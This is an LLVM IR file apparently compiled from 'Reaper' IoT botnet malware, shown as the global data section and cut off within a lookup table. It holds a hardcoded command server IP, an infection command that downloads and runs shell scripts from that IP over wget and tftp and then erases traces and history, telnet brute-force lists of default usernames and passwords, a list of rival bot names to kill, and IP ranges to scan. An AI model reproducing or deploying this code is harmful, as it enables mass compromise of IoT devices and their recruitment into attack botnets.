; ModuleID = 'host/ir_sub/Reaper.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@knownBots = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.82, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"hackmy*\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.29 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"tel*\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.37 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"xxb*\00", align 1
@.str.39 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.49 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.52 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.55 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.57 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.58 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"gtop\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"ftp*\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"botnet\00", align 1
@.str.66 = private unnamed_addr constant [8 x i8] c"swatnet\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"ballpit\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"fucknet\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"cracknet\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"weednet\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"gaynet\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"queernet\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"ballnet\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"unet\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"yougay\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"sttftp\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"sstftp\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"sbtftp\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"btftp\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"y0u1sg3y\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.82 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@PromServer = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i32 0, i32 0)], align 8
@.str.83 = private unnamed_addr constant [16 x i8] c"46.101.35.30:23\00", align 1
@infect = global i8* getelementptr inbounds ([341 x i8], [341 x i8]* @.str.84, i32 0, i32 0), align 8
@.str.84 = private unnamed_addr constant [341 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.35.30/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 46.101.35.30 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 46.101.35.30; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.85 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.87 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.89 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.95 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.97 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.98 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"tini\00\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"zyad1234\00\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"1234qwer\00\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"oelinux123\00\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.115, i32 0, i32 0), i8* null], align 16
@.str.106 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.107 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.110 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.115 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.119, i32 0, i32 0), i8* null], align 16
@.str.116 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.119 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* null], align 16
@.str.120 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.121 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.122 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.124 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@.str.127 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@Nranges = global [16 x i32] [i32 110, i32 111, i32 112, i32 113, i32 114, i32 115, i32 116, i32 117, i32 118, i32 119, i32 223, i32 1, i32 103, i32 203, i32 202, i32 122], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.558 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.130 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.131 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 